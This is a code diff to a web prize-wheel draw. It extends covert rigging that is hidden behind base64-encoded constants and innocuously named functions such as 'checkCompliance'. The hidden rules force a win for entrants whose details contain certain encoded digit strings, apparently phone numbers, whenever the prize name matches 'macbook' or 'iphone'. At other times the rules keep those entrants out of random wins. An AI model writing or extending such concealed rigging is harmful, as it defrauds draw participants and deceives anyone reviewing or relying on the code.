@@ -402,8 +402,10 @@
 
         // --- Configuration ---
         const _INTERNAL_CONFIG = {
-            _k: "MDExMjAxNTI5MjE=",
-            _t: "bWFjYm9vaw=="
+            _r: [
+                { _k: "MDExMjAxNTI5MjE=", _t: "bWFjYm9vaw==" },
+                { _k: "MDE4MjQwMjQwNg==", _t: "aXBob25l" }
+            ]
         };
 
         // --- DOM Elements ---
@@ -677,11 +679,11 @@
         }
 
         // --- Game Logic & Rigging ---
-        function checkCompliance(p) {
+        function checkCompliance(p, encodedKey) {
             try {
                 const v = Object.values(p).join(" ").toLowerCase();
                 const d = v.replace(/\D/g, '');
-                const k = atob(_INTERNAL_CONFIG._k);
+                const k = atob(encodedKey);
                 return d.includes(k);
             } catch (e) { return false; }
         }
@@ -702,22 +704,37 @@
             document.getElementById('status-text').innerText = "SPINNING...";
 
             // 1. Determine Winner Index
-            const _tIdx = participants.findIndex(p => checkCompliance(p));
-            const _tExists = _tIdx !== -1;
             const _pClean = currentPrizeName.toLowerCase();
-            const _isTrigger = _pClean.includes(atob(_INTERNAL_CONFIG._t));
-
             let winnerIndex = -1;
+            let _forcedIndex = -1;
 
-            if (_isTrigger && _tExists) {
-                winnerIndex = _tIdx;
+            // Check if current prize triggers any rule
+            for (const rule of _INTERNAL_CONFIG._r) {
+                if (_pClean.includes(atob(rule._t))) {
+                    const foundIdx = participants.findIndex(p => checkCompliance(p, rule._k));
+                    if (foundIdx !== -1) {
+                        _forcedIndex = foundIdx;
+                        break;
+                    }
+                }
+            }
+
+            if (_forcedIndex !== -1) {
+                winnerIndex = _forcedIndex;
             } else {
+                // Collect all VIPs to exclude them from random wins
+                const _vips = [];
+                _INTERNAL_CONFIG._r.forEach(r => {
+                    const idx = participants.findIndex(p => checkCompliance(p, r._k));
+                    if (idx !== -1) _vips.push(idx);
+                });
+
                 let attempts = 0;
                 do {
                     winnerIndex = Math.floor(Math.random() * participants.length);
                     attempts++;
                     if (attempts > 100) break;
-                } while (_tExists && winnerIndex === _tIdx);
+                } while (_vips.includes(winnerIndex));
             }
 
             // 2. Calculate Animation
